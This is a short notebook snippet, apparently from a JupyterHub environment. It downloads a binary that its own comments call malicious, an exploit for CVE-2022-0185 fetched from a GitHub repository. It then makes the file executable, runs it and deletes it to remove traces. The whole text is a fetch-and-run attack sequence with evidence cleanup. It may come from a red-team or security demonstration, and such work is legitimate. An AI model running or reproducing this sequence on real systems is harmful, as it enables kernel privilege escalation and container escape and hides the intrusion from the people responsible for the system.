# download malicious binary
import urllib.request
urllib.request.urlretrieve("https://github.com/nyrahul/CVE-2022-0185/raw/master/exploit", "/home/jovyan/exploit")

# execute it
!chmod +x /home/jovyan/exploit
!/home/jovyan/exploit

# cleanup
!rm -rf /home/jovyan/exploit
